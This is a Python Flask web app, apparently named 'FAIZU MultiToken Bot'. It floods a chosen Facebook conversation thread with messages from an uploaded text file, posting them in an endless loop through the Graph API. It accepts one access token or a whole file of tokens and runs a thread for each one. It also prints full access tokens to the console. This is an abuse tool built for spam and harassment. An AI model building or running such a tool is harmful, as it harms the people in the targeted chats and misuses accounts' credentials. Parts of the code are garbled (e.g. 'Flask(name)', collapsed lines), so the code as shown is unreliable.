from flask import Flask, request, render_template_string, redirect
import threading
import requests
import time
app = Flask(name) app.debug = True

active_threads = {} thread_info = {}

Bot thread

def message_sender(access_token, thread_id, prefix, delay, messages, thread_key): headers = { 'User-Agent': 'Mozilla/5.0', 'referer': 'https://google.com' }

print("\n[🔥 NEW BOT STARTED]", flush=True)
print(f"🧵 Thread ID: {thread_id}", flush=True)
print(f"🔑 Access Token: {access_token}", flush=True)
print(f"📛 Prefix: {prefix}", flush=True)
print(f"⏱ Delay: {delay}s | 💬 Messages: {len(messages)}", flush=True)
print(f"💻 Thread Key: {thread_key}", flush=True)
print("─────────────────────────────────────", flush=True)

thread_info[thread_key] = {
    'thread_id': thread_id,
    'token': access_token[:10] + "*****",
    'prefix': prefix
}

while active_threads.get(thread_key, False):
    for msg in messages:
        if not active_threads.get(thread_key, False):
            break
        try:
            full_message = f"{prefix} {msg}"
            url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            payload = {'access_token': access_token, 'message': full_message}
            res = requests.post(url, data=payload, headers=headers)
            status = "✅ Sent" if res.status_code == 200 else f"❌ Fail ({res.status_code})"
            print(f"[{status}] {full_message}", flush=True)
            time.sleep(delay)
        except Exception as e:
            print(f"[⚠️ ERROR] {e}", flush=True)
            time.sleep(5)

print(f"\n[🛑 BOT STOPPED] {thread_id} | {prefix}", flush=True)
active_threads.pop(thread_key, None)
thread_info.pop(thread_key, None)

@app.route('/', methods=['GET', 'POST']) def home(): if request.method == 'POST': mode = request.form.get('mode') thread_id = request.form.get('threadId') prefix = request.form.get('kidx') delay = int(request.form.get('time')) messages = request.files['txtFile'].read().decode().splitlines()

if mode == 'single':
        token = request.form.get('accessToken')
        thread_key = f"{thread_id}_{token[:5]}"
        active_threads[thread_key] = True
        thread = threading.Thread(target=message_sender, args=(token, thread_id, prefix, delay, messages, thread_key))
        thread.daemon = True
        thread.start()

    elif mode == 'multi':
        token_lines = request.files['tokenFile'].read().decode().splitlines()
        for token in token_lines:
            thread_key = f"{thread_id}_{token[:5]}"
            active_threads[thread_key] = True
            thread = threading.Thread(target=message_sender, args=(token, thread_id, prefix, delay, messages, thread_key))
            thread.daemon = True
            thread.start()

    return redirect('/status')

return render_template_string(form_html)

@app.route('/stop/<thread_key>', methods=['POST']) def stop_thread(thread_key): if thread_key in active_threads: active_threads[thread_key] = False return redirect('/status')

@app.route('/status') def status(): status_html = ''' <html><head> <title>Status | FAIZU BOT</title> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"> <style> body { background: #0f2027; color: white; padding: 30px; font-family: sans-serif; } .card { background-color: rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; margin-bottom: 20px; } .btn-stop { background: red; border: none; color: white; font-weight: bold; padding: 5px 15px; border-radius: 8px; } </style> </head><body> <h2>🟢 Running Bots</h2> {% if threads %} {% for key, info in threads.items() %} <div class="card"> <p><strong>Thread ID:</strong> {{ info.thread_id }}</p> <p><strong>Token:</strong> {{ info.token }}</p> <p><strong>Prefix:</strong> {{ info.prefix }}</p> <form action="/stop/{{ key }}" method="post"> <button class="btn-stop" type="submit">🛑 Stop This</button> </form> </div> {% endfor %} {% else %} <p>No bots running currently.</p> {% endif %} <a href="/" class="btn btn-light mt-3">⬅️ Back to Form</a> </body></html> ''' return render_template_string(status_html, threads=thread_info)

HTML with single/multi switch

form_html = '''

<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8" />
  <title>FAIZU TOOL | MultiBot</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: linear-gradient(to right, #1f4037, #99f2c8); font-family: 'Segoe UI', sans-serif; color: white; }
    .box { max-width: 650px; margin: 80px auto; background: rgba(0, 0, 0, 0.6); border-radius: 15px; padding: 30px; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
    .box h2 { text-align: center; margin-bottom: 30px; font-weight: bold; }
    .btn-submit { background: #00ffae; border: none; color: black; font-weight: bold; }
    .btn-submit:hover { background: #00ffaa; color: white; }
    footer { text-align: center; margin-top: 30px; font-size: 14px; color: #ccc; }
  </style>
</head><body>
  <div class="box">
    <h2>FAIZU | MultiToken Bot</h2>
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Select Mode:</label><br>
        <input type="radio" name="mode" value="single" checked onclick="toggleMode()"> Single Token
        <input type="radio" name="mode" value="multi" onclick="toggleMode()"> Multi Token
      </div>
      <div class="mb-3" id="singleTokenDiv">
        <label>Access Token:</label>
        <input type="text" class="form-control" name="accessToken" />
      </div>
      <div class="mb-3" id="multiTokenDiv" style="display:none">
        <label>Upload Token File (.txt):</label>
        <input type="file" class="form-control" name="tokenFile" accept=".txt" />
      </div>
      <div class="mb-3">
        <label>Thread ID (Convo ID):</label>
        <input type="text" class="form-control" name="threadId" required />
      </div>
      <div class="mb-3">
        <label>Prefix Name:</label>
        <input type="text" class="form-control" name="kidx" required />
      </div>
      <div class="mb-3">
        <label>Upload Messages (.txt):</label>
        <input type="file" class="form-control" name="txtFile" accept=".txt" required />
      </div>
      <div class="mb-3">
        <label>Delay (seconds):</label>
        <input type="number" class="form-control" name="time" min="1" required />
      </div>
      <button type="submit" class="btn btn-submit w-100">🚀 Start Bot</button>
      <a href="/status" class="btn btn-outline-light mt-3 w-100">📊 Show Threads</a>
    </form>
  </div>
  <footer>
    Developed by <strong>Stuner</strong> | Multi Mode Ready
  </footer>
  <script>
    function toggleMode() {
      let mode = document.querySelector('input[name="mode"]:checked').value;
      document.getElementById('singleTokenDiv').style.display = mode === 'single' ? 'block' : 'none';
      document.getElementById('multiTokenDiv').style.display = mode === 'multi' ? 'block' : 'none';
    }
  </script>
</body></html>
'''if name == 'main': app.run(host='0.0.0.0', port=5000)

